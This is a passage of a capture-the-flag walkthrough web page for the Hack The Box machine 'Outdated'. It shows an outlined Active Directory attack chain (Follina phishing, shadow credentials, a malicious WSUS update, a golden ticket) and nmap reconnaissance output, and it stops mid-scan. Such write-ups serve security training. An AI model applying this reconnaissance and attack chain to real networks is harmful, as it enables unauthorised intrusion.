<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.137.1">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Outdated HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Outdated HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
                        
                            Aero HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/certified-box/" title="./certified-box/">
                        
                            Certified HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Outdated HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.13.10"
                            >2024.13.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        25 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/medium/"
                            class="tag-btn">
                            Medium
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/wsus/"
                            class="tag-btn">
                            WSUS
                        </a>
                    
                        <a
                            href="/tags/kerberos/"
                            class="tag-btn">
                            Kerberos
                        </a>
                    
                        <a
                            href="/tags/follina/"
                            class="tag-btn">
                            Follina
                        </a>
                    
                        <a
                            href="/tags/rubeus/"
                            class="tag-btn">
                            Rubeus
                        </a>
                    
                        <a
                            href="/tags/whisker/"
                            class="tag-btn">
                            Whisker
                        </a>
                    
                        <a
                            href="/tags/shadow-credentials/"
                            class="tag-btn">
                            Shadow Credentials
                        </a>
                    
                        <a
                            href="/tags/msds-keycredentiallink/"
                            class="tag-btn">
                            msDS-KeyCredentialLink
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/outdated-box/" class="bread-btn">
    

    
        
            Outdated HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#outdated-hack-the-box-walkthrough-writeup">Outdated Hack The Box Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#nmap">NMAP:</a></li>
        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
        <li><a href="#smtp-25">SMTP <code>25</code>:</a></li>
        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
        <li><a href="#logging-into-the-shares-to-find-a-pdf">Logging into the <code>Shares</code> to find a <code>PDF</code>:</a></li>
        <li><a href="#attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</a></li>
        <li><a href="#reading-noc-reminder-dot-pdf-and-discovering-exploits-that-the-environment-is-susceptible-to">Reading <code>NOC_Reminder.pdf</code> and discovering exploits that the environment is susceptible to:</a></li>
        <li><a href="#investigating-the-cve-list-for-an-attack-path">Investigating the CVE list For an attack path:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#quick-overview-on-follina-exploit">Quick overview on Follina Exploit:</a></li>
        <li><a href="#testing-if-we-can-make-itsupport-click-an-emailed-link-using-swaks">Testing if we can make <code>itsupport</code> click an emailed link using <code>swaks</code>:</a></li>
        <li><a href="#trying-to-get-a-reverse-shell-using-the-follina-exploit">Trying to get a reverse shell using the <code>Follina</code> exploit:</a></li>
        <li><a href="#getting-a-reverse-shell-using-follina-dot-py">Getting a Reverse shell using <code>Follina.py</code>:</a></li>
        <li><a href="#enumerating-as-the-user-btables">Enumerating as the user <code>btables</code>:</a></li>
        <li><a href="#using-sharphound-dot-exe-to-enumerate-the-environment-dot">Using <code>SharpHound.exe</code> to enumerate the environment.</a></li>
        <li><a href="#transferring-the-sharphound-zip-back-to-myself-using-my-custom-python-webserver">Transferring the <code>SharpHound</code> Zip back to myself using my custom python webserver:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-lateral-movement">3. Lateral Movement:</a>
      <ul>
        <li><a href="#discovering-btables-has-addkeycredentiallink-privilege-over-sflowers">Discovering <code>btables</code> has <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>:</a></li>
        <li><a href="#building-whisker-dot-exe">Building <code>whisker.exe</code>:</a></li>
        <li><a href="#adding-shadow-credentials-to-sflowers-using-whisker-dot-exe">Adding Shadow Credentials to <code>sflowers</code> using <code>whisker.exe</code> :</a></li>
        <li><a href="#i-use-the-base64-encoded-certificate-to-request-a-tgt-for-sflowers-using-rubeus">I use the base64 encoded certificate to request a <code>TGT</code> for <code>sflowers</code> using rubeus:</a></li>
        <li><a href="#enumerating-the-host-as-slfowers">Enumerating the Host as <code>slfowers</code>:</a></li>
        <li><a href="#seeing-sflowers-has-outbound-object-control-over-the-ca">Seeing <code>sflowers</code> has outbound object control over the <code>CA</code>:</a></li>
        <li><a href="#discovering-sflowers-is-part-of-the-wsus-administrators-group">Discovering <code>sflowers</code> is part of the wsus administrators group:</a></li>
        <li><a href="#what-is-wsus--windows-server-update-services">What is <code>WSUS</code> (Windows Server Update Services)?</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
      <ul>
        <li><a href="#manually-enumerating-the-wsus-service-by-querying-the-registry">Manually Enumerating the <code>WSUS</code> Service by querying the registry:</a></li>
        <li><a href="#using-sharpwsus-to-push-a-malicious-update">Using <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a> to push a malicious update:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-persistence">4. Persistence:</a>
      <ul>
        <li><a href="#creating-a-golden-ticket-with-mimikatz-dot-exe">Creating a golden ticket with <code>mimikatz.exe</code>:</a></li>
        <li><a href="#dumping-ntds-for-fun-for-fun-and-profit">Dumping NTDS for fun for fun and profit:</a></li>
      </ul>
    </li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="outdated-hack-the-box-walkthrough-writeup">Outdated Hack The Box Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Outdated">https://app.hackthebox.com/machines/Outdated</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</h2>
<ul>
<li><strong>Variables</strong>:
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Wordlists</strong>:
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="nmap">NMAP:</h3>
<ul>
<li>
<p><strong>Basic Scan</strong>:</p>
<ul>
<li><code>nmap $box -Pn -oA basicScan</code>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/Outdated/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:49:14%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-10%2008:49%20BST%0aNmap%20scan%20report%20for%2010.129.229.239%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%20988%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a25/tcp%20%20%20open%20%20smtp%0a53/tcp%20%20%20open%20%20domain%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2010.89%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 08:49:14 zsh ❯ nmap $box -Pn -oA basicScan
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-10 08:49 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.239
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>25/tcp   open  smtp
</span></span><span style="display:flex;"><span>53/tcp   open  domain
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.89 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
<li>
<p><strong>In depth scan</strong>:</p>
<ul>
<li>
<p><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20kali%20in%2046.02-HTB/BlogEntriesMade/Outdated/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2011s%0a%20%20%f0%9f%95%99%2008:49:33%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-10%2008:49%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.229.239%0a%20%20Host%20is%20up%20%280.040s%20latency%29.%0a%20%20Not%20shown:%2065514%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a%20%2025/tcp%20%20%20%20open%20%20smtp%20%20%20%20%20%20%20%20%20%20hMailServer%20smtpd%0a%20%20%7c%20smtp-commands:%20mail.outdated.htb,%20SIZE%2020480000,%20AUTH%20LOGIN,%20HELP%0a%20%20%7c_%20211%20DATA%20HELO%20EHLO%20MAIL%20NOOP%20QUIT%20RCPT%20RSET%20SAML%20TURN%20VRFY%0a%20%2053/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a%20%2088/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-10%2015:52:26Z%29%0a%20%20135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a%20%20445/tcp%20%20%20open%20%20microsoft-ds?%0a%20%20464/tcp%20%20%20open%20%20kpasswd5?%0a%20%20593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%20636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20outdated.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c_ssl-date:%202024-10-10T15:54:00&#43;00:00;%20&#43;8h00m01s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC.outdated.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC.outdated.htb%0a%20%20%7c%20Not%20valid%20before:%202023-12-13T00:17:36%0a%20%20%7c_Not%20valid%20after:%20%202024-12-12T00:17:36%0a%20%203268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20outdated.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c_ssl-date:%202024-10-10T15:54:00&#43;00:00;%20&#43;8h00m01s%20from%20scanner%20time.%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC.outdated.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC.outdated.htb%0a%20%20%7c%20Not%20valid%20before:%202023-12-13T00:17:36%0a%20%20%7c_Not%20valid%20after:%20%202024-12-12T00:17:36%0a%20%203269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20outdated.htb0.,%20Site:%20Default-First-Site-Name%29%0a%20%20%7c%20ssl-cert:%20Subject:%20commonName=DC.outdated.htb%0a%20%20%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC.outdated.htb%0a%20%20%7c%20Not%20valid%20before:%202023-12-13T00:17:36%0a%20%20%7c_Not%20valid%20after:%20%202024-12-12T00:17:36%0a%20%20%7c_ssl-date:%202024-10-10T15:54:00&#43;00:00;%20&#43;8h00m01s%20from%20scanner%20time.%0a%20%205985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-title:%20Not%20Found%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%208530/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%20%20%7c_http-server-header:%20Microsoft-IIS/10.0%0a%20%20%7c%20http-methods:%0a%20%20%7c_%20%20Potentially%20risky%20methods:%20TRACE%0a%20%20%7c_http-title:%20Site%20doesn%27t%20have%20a%20title.%0a%20%208531/tcp%20%20open%20%20unknown%0a%20%209389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a%20%2049667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049691/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%2049692/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049924/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049950/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049984/tcp%20open%2